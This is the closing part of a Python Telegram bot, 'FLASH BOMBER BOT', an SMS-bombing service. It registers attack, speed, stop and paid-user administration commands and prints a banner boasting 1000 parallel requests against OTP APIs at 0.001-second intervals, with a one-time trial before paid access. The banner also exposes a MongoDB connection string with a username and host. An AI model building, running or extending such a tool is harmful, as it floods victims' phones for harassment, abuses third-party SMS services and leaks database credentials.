    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("speed", speed_command))
    application.add_handler(CommandHandler("stop", stop_attack))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("resettrial", reset_trial))
    application.add_handler(CommandHandler("blocktrial", block_trial))
    application.add_handler(CommandHandler("unblocktrial", unblock_trial))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    print(f"""
╔════════════════════════════════════════════════╗
║        ⚡💥 FLASH BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER           ║
╚════════════════════════════════════════════════╝

📡 Bot Information:
├─🤖 Bot Token: Loaded
├─📊 Total APIs: {TOTAL_APIS}
├─⚡ Attack Mode: FLASH ATTACK
├─💾 Database: MongoDB (Cloud)
├─📀 Database URL: mongodb+srv://nikilsaxena843_db_user:****@vipbot.puv6gfk.mongodb.net
├─👑 Admin Users: {len(ADMIN_USER_IDS)}
└─🔥 Status: Starting...

⚡ FLASH ATTACK FEATURES:
├─ Speed: Level 5 (FLASH MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Delay: 0.001 seconds
└─ OTPs: Maximum possible

⚠️ TRIAL SYSTEM (STRICT - ONE TIME ONLY):
├─ Frequency: ONE TIME ONLY
├─ Duration: 60 seconds
├─ After trial: PERMANENTLY BLOCKED
├─ No further trial access
└─ Only paid access available

🔧 Available Commands:
├─🎯 /start - Start bot
├─🆘 /help - Help menu
├─🎁 /trial - One-time free trial (60s)
├─📊 /mytrial - Check trial status
├─💥 /attack - Paid flash attack
├─⚡ /speed - Set speed (5=Flash Mode) - PAID ONLY
├─📊 /stats - View statistics
├─🛑 /stop - Stop attack
├—🔄 /resettrial - Reset user trial (Admin)
├—🚫 /blocktrial - Block user trial (Admin)
├—✅ /unblocktrial - Unblock user trial (Admin)
├─➕ /add - Add paid user (Admin)
├─➖ /remove - Remove user (Admin)
├─📋 /users - List users (Admin)
└─📢 /broadcast - Broadcast (Admin)

🔥 BOT IS NOW RUNNING IN FLASH MODE!
Press Ctrl+C to stop
""")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
